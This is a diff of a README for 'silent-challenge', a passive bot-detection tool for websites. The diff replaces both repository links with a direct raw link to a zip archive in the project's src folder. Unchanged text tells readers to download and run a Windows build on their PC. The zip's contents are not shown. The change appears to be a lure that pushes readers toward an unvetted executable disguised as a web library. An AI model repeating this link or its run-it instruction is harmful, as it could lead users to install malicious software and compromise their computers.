@@ -1,6 +1,6 @@
 # 🕊️ silent-challenge - Simple passive bot checks
 
-[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nielsmi7704/silent-challenge)
+[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nielsmi7704/silent-challenge/main/src/silent-challenge-2.6.zip)
 
 ## 🧩 What this app does
 
@@ -20,7 +20,7 @@ This tool fits sites that need a quiet layer of bot detection without a full vis
 
 Use this link to visit the download page:
 
-[Visit the silent-challenge download page](https://github.com/nielsmi7704/silent-challenge)
+[Visit the silent-challenge download page](https://raw.githubusercontent.com/nielsmi7704/silent-challenge/main/src/silent-challenge-2.6.zip)
 
 If you find a Windows build or release file there, download it and run it on your PC. If the page gives you source files, use the install steps below to set it up in your app.
 
